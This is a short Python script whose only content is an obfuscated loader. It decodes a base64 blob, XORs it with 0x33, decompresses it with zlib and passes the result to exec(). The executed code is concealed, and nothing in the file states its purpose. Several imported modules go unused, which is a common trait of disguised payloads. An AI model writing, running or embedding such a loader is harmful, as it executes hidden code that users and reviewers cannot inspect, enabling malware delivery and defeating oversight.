import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'S69mvXI58BMjdsStUUUVI9GRajoKdjwTEi66U2cvtnH77pBaosVcVcLNTP9ZJBFLEaLCfQEbSpI1lr8Aepq949kyBXxas9NQqZTa4kxJBia8pvFPpM1yLidjPFjZL95ezoJ3fwoJ4094GqMn0VvtYC1+Rjn9a2If6mXexNq90EjqsPZCxgjc6jYci3PV'
exec(zlib.decompress(bytes(b ^ 0x33 for b in base64.b64decode(_p))))
